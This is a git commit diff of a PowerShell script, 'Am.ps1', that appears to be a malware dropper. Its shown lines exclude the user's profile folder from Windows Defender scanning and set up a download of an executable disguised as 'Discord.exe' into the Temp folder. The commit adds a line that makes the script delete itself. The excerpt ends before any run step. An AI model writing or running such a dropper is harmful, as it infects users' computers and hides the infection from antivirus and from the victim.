a2408351d466e8f321f4e431d4552427e7a522f3
AnonAm93 <am9.9@outlook.com>
2024-10-05 15:33:51 -0700

    Update Am.ps1

--- Am.ps1
+++ Am.ps1
@@ -1,4 +1,5 @@
 Add-MpPreference -ExclusionPath $env:USERPROFILE
+Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force
 $url = 'https://github.com/AnonAm93/1/raw/refs/heads/main/Discord.exe'
 $outputFile = [System.IO.Path]::Combine($env:Temp, 'Am.exe')
 Start-Sleep -Milliseconds 100 
